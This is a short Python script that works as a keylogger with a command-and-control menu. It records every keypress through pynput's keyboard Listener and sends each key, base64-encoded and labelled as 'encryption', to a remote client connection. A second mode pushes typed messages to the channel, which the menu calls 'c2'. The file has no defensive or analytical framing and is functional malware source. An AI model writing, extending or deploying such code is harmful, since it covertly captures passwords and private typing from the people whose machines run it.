import client
from pynput.keyboard import Key, Listener
import base64

def init():
    print("1 - Message c2")
    print("2 - log")
    menu = input()
    if menu == "1":
        while True:
            data = input("Send message: ")
            client.send(encrypt(data))
            print("SUCCESS!")
    else:
        print("LOGGING ACTIVE")
        log()

def encrypt(data):
    data = str(data)
    data = data.encode("utf-8")
    data = base64.b64encode(data)
    return data


def decrypt(data):
    data = base64.b64decode(data)
    data = data.decode("utf-8")
    print(data)
    return data


def log():
    def on_press(key):
        client.send(encrypt(key))
    with Listener(on_press=on_press) as listener:
        listener.join()


init()
